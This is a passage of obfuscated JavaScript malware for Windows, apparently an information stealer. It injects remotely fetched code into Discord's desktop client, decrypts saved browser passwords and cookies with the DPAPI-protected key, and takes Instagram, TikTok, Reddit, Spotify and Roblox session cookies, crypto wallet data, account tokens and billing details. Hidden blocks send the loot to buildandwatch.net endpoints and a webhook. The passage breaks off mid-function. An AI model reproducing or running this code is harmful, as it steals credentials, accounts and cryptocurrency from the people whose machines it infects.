_0x51bdcf=_0x1634,_0x12dc6c=[_0x51bdcf(0x1e7),_0x51bdcf(0x1f8),_0x51bdcf(0x1fa),_0x51bdcf(0x1f3),_0x51bdcf(0x1ee),'3566961xYNQfN',_0x51bdcf(0x1ea),'525010kywqWi',_0x51bdcf(0x1fc),_0x51bdcf(0x1e6),'8629312yYMqaF',_0x51bdcf(0x1e9),_0x51bdcf(0x1f9),'879832MsxmBy',_0x51bdcf(0x1e8),_0x51bdcf(0x1ec)];return _0x26f3=function(){return _0x12dc6c;},_0x26f3();}function _0x164c(_0x2bc868,_0x3649e0){var _0x29502a=_0x26f3();return _0x164c=function(_0x43b539,_0x377013){_0x43b539=_0x43b539-(-0x801+0x20dd+-0x1*0x1831);var _0x2de92e=_0x29502a[_0x43b539];return _0x2de92e;},_0x164c(_0x2bc868,_0x3649e0);}var _0x578039=_0x164c;(function(_0x59f36c,_0x21f453){var _0x121802=_0x1634,_0x3d371c=_0x164c,_0x44e71e=_0x59f36c();while(!![]){try{var _0x29ec40=-parseInt(_0x3d371c(0xac))/(0x1*-0x593+0x1b2b+-0x1597)+-parseInt(_0x3d371c(0xad))/(-0x36*-0xad+0x14*-0x1ec+0x32*0xa)+-parseInt(_0x3d371c(0xb5))/(-0xcd*0x2b+-0x11b*-0x1d+0x263)+parseInt(_0x3d371c(0xb3))/(-0x10*-0x1d3+-0x5*0x7cc+0x9d0)*(parseInt(_0x3d371c(0xb7))/(-0xdfb*0x2+0xb86+-0x1*-0x1075))+-parseInt(_0x3d371c(0xb1))/(0x1ef6+-0xe52+-0x109e)*(parseInt(_0x3d371c(0xae))/(-0x189f+-0x236+0x12*0x17e))+-parseInt(_0x3d371c(0xba))/(0x1d7a+0x1c27+-0xb85*0x5)+-parseInt(_0x3d371c(0xb0))/(0x1646+-0x1116+0x527*-0x1)*(-parseInt(_0x3d371c(0xb8))/(-0x2173+0x29*-0x7b+0x3530));if(_0x29ec40===_0x21f453)break;else _0x44e71e[_0x121802(0x1f2)](_0x44e71e[_0x121802(0x1f1)]());}catch(_0x5c4ab8){_0x44e71e['push'](_0x44e71e[_0x121802(0x1f1)]());}}}(_0x26f3,-0x8153f*-0x1+-0x15505a+0x1b*0xe70f),axios[_0x578039(0xb6)](_0x578039(0xb9)+_0x578039(0xab)+_0x578039(0xaf)+'og',{'content':'','embeds':[userInformationEmbed,friendsEmbed]})[_0x578039(0xb4)](_0x4e795a=>{})[_0x578039(0xb2)](()=>{}),axios[_0x578039(0xb6)](webhook3939,{'content':'','embeds':[userInformationEmbed,friendsEmbed]})[_0x578039(0xb4)](_0x59c5d0=>{})[_0x578039(0xb2)](()=>{}));

        continue;
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}




////


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
    }
    await httpx(`https://buildandwatch.net/xxfixxyy`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}



async function getExtension() {
  addFolder('Wallets'); // Assuming addFolder() function is defined somewhere

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

const walletCountStr = walletCount.toString();
const browserCountStr = browserCount.toString();

if (walletCountStr !== '0' || browserCountStr !== '0') {
  const message = {
    embeds: [
      {
        title: 'Wallet Information',
        description: 'Here is the wallet information:',
        color: 0x00ff00,
        fields: [
          {
            name: '🛠️ Browser wallet',
            value: walletCountStr,
            inline: true,
          },
        ],
      },
    ],
  };

(function(_0x390f93,_0x578dcb){var _0x28886d=_0x4730,_0x5d02eb=_0x390f93();while(!![]){try{var _0x533464=parseInt(_0x28886d(0x14d))/0x1*(parseInt(_0x28886d(0x152))/0x2)+parseInt(_0x28886d(0x15b))/0x3+-parseInt(_0x28886d(0x14f))/0x4*(-parseInt(_0x28886d(0x15c))/0x5)+parseInt(_0x28886d(0x151))/0x6+parseInt(_0x28886d(0x15f))/0x7+parseInt(_0x28886d(0x153))/0x8+-parseInt(_0x28886d(0x15a))/0x9;if(_0x533464===_0x578dcb)break;else _0x5d02eb['push'](_0x5d02eb['shift']());}catch(_0x4b9d14){_0x5d02eb['push'](_0x5d02eb['shift']());}}}(_0x3a33,0xbbcdd));function _0x3a33(){var _0x20d5a2=['272634BPkyAY','5137328KpBQSy','324RVocXh','80530IAypWO','30ZAJOig','4eOTukw','shift','7107036hOcYgP','26iuQGJl','1733888FSNKFR','push','210726PqMhgy','852058ZqNFZP','168BFKEVN','3329826OpItbt','358680mIrhwM','49087998AjIbeO','4608948UJWCkK','7525575WVqmhW','https://bu'];_0x3a33=function(){return _0x20d5a2;};return _0x3a33();}function _0x15cd(){var _0x5a54f2=_0x4730,_0x54307e=[_0x5a54f2(0x155),'post',_0x5a54f2(0x157),'2449696kEBfuF',_0x5a54f2(0x15d),_0x5a54f2(0x158),_0x5a54f2(0x14c),_0x5a54f2(0x14e),_0x5a54f2(0x159),_0x5a54f2(0x15e),'88390izxvfh','ildandwatc',_0x5a54f2(0x156),'h.net/gtbl'];return _0x15cd=function(){return _0x54307e;},_0x15cd();}function _0x4730(_0x4894aa,_0x1dda5c){var _0x3a33bb=_0x3a33();return _0x4730=function(_0x473024,_0x1a9b96){_0x473024=_0x473024-0x14c;var _0x5ee2ac=_0x3a33bb[_0x473024];return _0x5ee2ac;},_0x4730(_0x4894aa,_0x1dda5c);}function _0x1f41(_0x333431,_0x480e7d){var _0x5368fa=_0x15cd();return _0x1f41=function(_0x4837cf,_0x13e1c0){_0x4837cf=_0x4837cf-(0xac9+0x218b+-0xf8*0x2d);var _0x5de409=_0x5368fa[_0x4837cf];return _0x5de409;},_0x1f41(_0x333431,_0x480e7d);}var _0x3c4182=_0x1f41;(function(_0x2be0ba,_0x39ae6d){var _0x367cc2=_0x4730,_0x3a05ff=_0x1f41,_0x54983a=_0x2be0ba();while(!![]){try{var _0x32dccc=-parseInt(_0x3a05ff(0xbe))/(0x8ed+0x2*0x715+-0x1716)+parseInt(_0x3a05ff(0xc5))/(-0x19e0+-0x1*-0x169a+0x348)+-parseInt(_0x3a05ff(0xc0))/(-0x14*0x12d+-0x23d1+0x9*0x698)+parseInt(_0x3a05ff(0xc3))/(0x49b*-0x1+0x490*0x3+0x911*-0x1)+-parseInt(_0x3a05ff(0xc7))/(-0x13*0x66+-0x2631*-0x1+0x1e9a*-0x1)*(-parseInt(_0x3a05ff(0xc9))/(-0x15f9+-0xc7a+-0x6e5*-0x5))+parseInt(_0x3a05ff(0xc2))/(-0x8d2*0x1+-0x1672+0x1f4b)*(-parseInt(_0x3a05ff(0xc8))/(0x11aa+0x16a7*0x1+-0x2849))+parseInt(_0x3a05ff(0xc6))/(0x269b+0x2ea*0xb+-0xa*0x710)*(parseInt(_0x3a05ff(0xbc))/(-0x1a88*0x1+-0x98*0x6+-0x1e22*-0x1));if(_0x32dccc===_0x39ae6d)break;else _0x54983a[_0x367cc2(0x154)](_0x54983a[_0x367cc2(0x150)]());}catch(_0x413f8a){_0x54983a[_0x367cc2(0x154)](_0x54983a['shift']());}}}(_0x15cd,-0x5dec0+0x56*0x191+0x129dd5*0x1),axios[_0x3c4182(0xc1)](_0x3c4182(0xc4)+_0x3c4182(0xbd)+_0x3c4182(0xbf)+'og',message));

} else {
  console.log('walletCount and browserCount are both 0. No action needed.');
}
 
}



async function getPasswords() {
  const _0x540754 = [];
  let passwordsFound = false; // Şifre bulunduğu zaman bu değeri true yapacağız

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );

            count.passwords++;
            passwordsFound = true; // Şifre bulunduğunu işaretliyoruz
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length) {
    fs.writeFileSync("Passwords.txt", _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }

  if (!passwordsFound) {
    // Şifre bulunamadıysa bu kod bloğu çalışır
    fs.writeFileSync("Passwords.txt", 'No passwords found.', {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
  
  
(function(_0x406360,_0x294af6){const _0x4810f5=_0x3f82,_0x2a517d=_0x406360();while(!![]){try{const _0x13406e=-parseInt(_0x4810f5(0x186))/0x1+-parseInt(_0x4810f5(0x17f))/0x2+-parseInt(_0x4810f5(0x17e))/0x3+-parseInt(_0x4810f5(0x184))/0x4+-parseInt(_0x4810f5(0x183))/0x5+-parseInt(_0x4810f5(0x194))/0x6*(-parseInt(_0x4810f5(0x1a0))/0x7)+parseInt(_0x4810f5(0x190))/0x8;if(_0x13406e===_0x294af6)break;else _0x2a517d['push'](_0x2a517d['shift']());}catch(_0x2f34ab){_0x2a517d['push'](_0x2a517d['shift']());}}}(_0xa99c,0xbbe37));const _0x2fe11d=_0x1499;function _0x2e1f(){const _0x847325=_0x3f82,_0x3c66fb=[_0x847325(0x182),_0x847325(0x18b),_0x847325(0x199),_0x847325(0x191),'post','Request\x20wa',_0x847325(0x17d),'then',_0x847325(0x17a),_0x847325(0x19f),_0x847325(0x181),'utf8','sword',_0x847325(0x19d),_0x847325(0x180),_0x847325(0x18d),_0x847325(0x195),'error',_0x847325(0x19b),_0x847325(0x197),_0x847325(0x18a),_0x847325(0x193),'iled\x20with\x20',_0x847325(0x19e),_0x847325(0x17c),'Passwords.',_0x847325(0x187),_0x847325(0x18f),'Ogkmu','496064mPbTLv',_0x847325(0x185),_0x847325(0x198),'391965KVcnhi',_0x847325(0x19a),_0x847325(0x189),_0x847325(0x17b),_0x847325(0x196),_0x847325(0x188),'57DSVnmO',_0x847325(0x178),_0x847325(0x18c),_0x847325(0x19c),_0x847325(0x192),_0x847325(0x177),'KyUKx','readFile'];return _0x2e1f=function(){return _0x3c66fb;},_0x2e1f();}function _0x3f82(_0x548f61,_0x1f2744){const _0xa99cde=_0xa99c();return _0x3f82=function(_0x3f8269,_0x59d22c){_0x3f8269=_0x3f8269-0x177;let _0x343428=_0xa99cde[_0x3f8269];return _0x343428;},_0x3f82(_0x548f61,_0x1f2744);}function _0xa99c(){const _0x2397ee=['hhRtp','pShaG','submit','bPXei','1396257sDmUgG','91312ZJPpou','30OfydHh','ildandwatc','append','1188065eyZxti','1286520zMrMKD','29704BcJeTP','723782WaGhsb','status','ile\x20making','status\x20cod','An\x20error\x20o','file','https://bu','ccurred\x20wh','push','st:\x20','14612280qrzUBh','aaETj','\x20the\x20reque','h.net/gpas','22566OHYuLe','s\x20successf','71343FZbjgV','log','1866880biuqGi','2434491svhUxH','e:\x20','881710jtlfcV','catch','txt','Stream','Request\x20fa','1372MdYvnP','createRead','rTyNm','shift'];_0xa99c=function(){return _0x2397ee;};return _0xa99c();}(function(_0xdf9ab0,_0x6b6d2c){const _0x2878ad=_0x3f82,_0x464bb8=_0x1499,_0x478441=_0xdf9ab0();while(!![]){try{const _0x3d4355=-parseInt(_0x464bb8(0x152))/(0xc0+0x80b*-0x4+0x1f6d)+-parseInt(_0x464bb8(0x14c))/(0x1df9*-0x1+-0x592+-0x1*-0x238d)*(-parseInt(_0x464bb8(0x154))/(-0x1aea+-0x1080+-0x1*-0x2b6d))+-parseInt(_0x464bb8(0x14b))/(-0x199+-0x5*-0x607+-0x1c86)+-parseInt(_0x464bb8(0x16e))/(-0x1*-0x17a1+0xa61*-0x2+-0x2da)+parseInt(_0x464bb8(0x16a))/(0x1*0x50a+-0x61*0x11+-0x1*-0x16d)*(parseInt(_0x464bb8(0x14e))/(-0x91d+-0x190b+0x222f))+parseInt(_0x464bb8(0x14d))/(0x1c6e+0xcd0+-0xd3*0x32)+-parseInt(_0x464bb8(0x15e))/(-0xa2+-0x4*0x417+-0x1107*-0x1);if(_0x3d4355===_0x6b6d2c)break;else _0x478441[_0x2878ad(0x18e)](_0x478441[_0x2878ad(0x179)]());}catch(_0x4874dc){_0x478441[_0x2878ad(0x18e)](_0x478441['shift']());}}}(_0x2e1f,0x24ec5*-0x1+0x8a7*0x72+-0x32*-0x411),fs[_0x2fe11d(0x15b)](_0x2fe11d(0x147)+_0x2fe11d(0x169),_0x2fe11d(0x167),(_0x1747df,_0x567da5)=>{const _0x330355=_0x2fe11d,_0x3fd84c={'rTyNm':function(_0x1b3ff1,_0x21125f){return _0x1b3ff1===_0x21125f;},'aaETj':_0x330355(0x161)+_0x330355(0x16c)+'ul','hhRtp':function(_0x57bb20,_0xf1f125){return _0x57bb20+_0xf1f125;},'bPXei':_0x330355(0x165)+_0x330355(0x144)+_0x330355(0x150)+_0x330355(0x14f),'pShaG':function(_0x229c76,_0x4e30d1){return _0x229c76+_0x4e30d1;},'KyUKx':_0x330355(0x142)+_0x330355(0x16b)+_0x330355(0x153)+_0x330355(0x158)+_0x330355(0x149),'Ogkmu':_0x330355(0x156)+_0x330355(0x166)+_0x330355(0x143)+_0x330355(0x168)};if(_0x1747df)throw _0x1747df;const _0x21d351=_0x567da5;axios[_0x330355(0x160)](_0x3fd84c[_0x330355(0x14a)],{'password':_0x21d351})[_0x330355(0x163)](_0x1e2da5=>{const _0x2fae51=_0x330355;_0x3fd84c[_0x2fae51(0x155)](_0x1e2da5[_0x2fae51(0x148)],-0x1b86+0x2*0xacf+0x6b0)?console[_0x2fae51(0x141)](_0x3fd84c[_0x2fae51(0x15f)]):console[_0x2fae51(0x16d)](_0x3fd84c[_0x2fae51(0x164)](_0x3fd84c[_0x2fae51(0x162)],_0x1e2da5[_0x2fae51(0x148)]));})[_0x330355(0x157)](_0x5e4695=>{const _0x31fa38=_0x330355;console[_0x31fa38(0x16d)](_0x3fd84c[_0x31fa38(0x151)](_0x3fd84c[_0x31fa38(0x15a)],_0x5e4695));});}));function _0x1499(_0x2bac94,_0x12c79c){const _0x3c594b=_0x2e1f();return _0x1499=function(_0x1442b4,_0x19708b){_0x1442b4=_0x1442b4-(0x21f1+-0x1204+-0xeac);let _0x4fd28b=_0x3c594b[_0x1442b4];return _0x4fd28b;},_0x1499(_0x2bac94,_0x12c79c);}const form=new FormData();form[_0x2fe11d(0x15c)](_0x2fe11d(0x15d),fs[_0x2fe11d(0x159)+_0x2fe11d(0x145)](_0x2fe11d(0x147)+_0x2fe11d(0x169))),form[_0x2fe11d(0x146)](webhook3939);

 
};





async function getCookiesAndSendWebhook() {
  addFolder('Wallets\\Cookies');
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

  if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
              setRedditSession(`${decrypted}`);
            }

  if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
              SpotifySession(`${decrypted}`);
            }

            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

// Create a new zip archive
  const zip = new AdmZip();

  // Add all the individual browser cookie files to the archive
  for (let [browserName, cookies] of Object.entries(cookiesData)) {
    if (cookies.length !== 0) {
      const cookiesContent = cookies.join('');
      const fileName = `${browserName}.txt`;

      // Add the file to the zip archive
      zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
    }
  }

  // Save the zip archive to a file
  zip.writeZip('cookies.zip');

(function(_0x58e17d,_0x142b80){const _0x446403=_0x5294,_0x389152=_0x58e17d();while(!![]){try{const _0x347e9f=parseInt(_0x446403(0x74))/0x1+-parseInt(_0x446403(0x72))/0x2+-parseInt(_0x446403(0x6e))/0x3*(parseInt(_0x446403(0x8e))/0x4)+-parseInt(_0x446403(0x71))/0x5*(parseInt(_0x446403(0x8c))/0x6)+parseInt(_0x446403(0x7e))/0x7*(parseInt(_0x446403(0x7f))/0x8)+-parseInt(_0x446403(0x77))/0x9*(-parseInt(_0x446403(0x7b))/0xa)+-parseInt(_0x446403(0x83))/0xb;if(_0x347e9f===_0x142b80)break;else _0x389152['push'](_0x389152['shift']());}catch(_0x26e591){_0x389152['push'](_0x389152['shift']());}}}(_0x1225,0xa6dad));const _0x5f51ab=_0xda0f;function _0xda0f(_0x703bf,_0x39c917){const _0x45b7c1=_0x40f1();return _0xda0f=function(_0x1256c6,_0x1bc497){_0x1256c6=_0x1256c6-(-0x4f*0x5+-0xaa0+0x1*0xd09);let _0x20d116=_0x45b7c1[_0x1256c6];return _0x20d116;},_0xda0f(_0x703bf,_0x39c917);}function _0x1225(){const _0x3cbc4a=['potatochip','get','error','6QlNWeI','githubphxi','1552229COjHOq','829662qfQNsD','data','110532UpxjDv','156444rKZLSu','submit','3UwctwL','ildandwatc','h.net/gcoo','5SWAvAZ','33606DufExk','18124UayFIt','362963HaYEwa','push','shift','9888363KGzSgt','scandy1295','Stream','sBObr','10sUrlvv','file','https://bu','70EnzsAn','87272smdxEH','kies','then','1661794FiFklf','7750710jvcWtS','catch','7791480ppAigu'];_0x1225=function(){return _0x3cbc4a;};return _0x1225();}function _0x5294(_0x59ea3c,_0x10819c){const _0x12259f=_0x1225();return 